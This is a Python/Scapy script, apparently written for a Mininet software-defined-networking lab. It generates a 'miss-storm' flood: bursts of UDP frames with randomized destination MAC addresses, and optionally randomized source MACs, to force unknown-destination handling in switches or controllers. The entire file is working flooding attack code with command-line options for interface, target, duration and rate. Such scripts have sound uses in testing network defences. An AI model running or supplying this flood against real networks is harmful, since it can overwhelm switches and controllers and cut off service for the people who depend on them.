#!/usr/bin/env python3
import argparse
import random
import time

from scapy.all import Ether, IP, UDP, sendp

def rand_mac(local=True):
	# local=True makes it a "locally administered" MAC (starts with 02)
	first = 0x02 if local else random.randint(0, 255)
	return "%02x:%02x:%02x:%02x:%02x:%02x" % (
		first,
		random.randint(0, 255),
		random.randint(0, 255),
		random.randint(0, 255),
		random.randint(0, 255),
		random.randint(0, 255),
	)

def main():
	p = argparse.ArgumentParser(description="Generate a miss-storm style attack (random dst MAC frames).")
	p.add_argument("--iface", required=True, help="Interface to send on (e.g., h3-eth0)")
	p.add_argument("--target", default="10.0.0.1", help="Target IP inside Mininet (default: 10.0.0.1)")
	p.add_argument("--src", default="10.0.0.3", help="Source IP (default: 10.0.0.3)")
	p.add_argument("--seconds", type=float, default=5.0, help="Duration seconds (default: 5)")
	p.add_argument("--dport", type=int, default=1234, help="UDP destination port")
	p.add_argument("--burst", type=int, default=200, help="Packets per send burst (default: 200)")
	p.add_argument("--max_packets", type=int, default=200000, help="Safety cap on total packets")
	p.add_argument("--random_src_mac", action="store_true",
	               help="Also randomize source MAC each packet (stronger miss-storm).")
	p.add_argument("--pps", type=int, default=0,
	               help="Optional rate cap packets/sec (0 = as fast as possible).")
	args = p.parse_args()

	start = time.time()
	end = start + args.seconds

	total_sent = 0
	next_send_time = start

	print(f"[attack] iface={args.iface} target={args.target} seconds={args.seconds} "
	      f"burst={args.burst} pps_cap={args.pps} random_src_mac={args.random_src_mac}")

	while time.time() < end and total_sent < args.max_packets:
		# Rate cap (optional)
		if args.pps > 0:
			now = time.time()
			if now < next_send_time:
				time.sleep(next_send_time - now)
			# schedule next send time based on burst size
			next_send_time = time.time() + (args.burst / float(args.pps))

		pkts = []
		for _ in range(args.burst):
			dst = rand_mac(local=True)  # random dst MAC -> forces unknown dst
			if args.random_src_mac:
				src_mac = rand_mac(local=True)
			else:
				src_mac = None

			eth = Ether(dst=dst) if src_mac is None else Ether(dst=dst, src=src_mac)
			pkt = eth / IP(dst=args.target, src=args.src) / UDP(
				dport=args.dport,
				sport=random.randint(1024, 65535)
			)
			pkts.append(pkt)

		sendp(pkts, iface=args.iface, verbose=0)
		total_sent += len(pkts)

	print(f"[attack] done. total_sent={total_sent}")


if __name__ == "__main__":
	main()
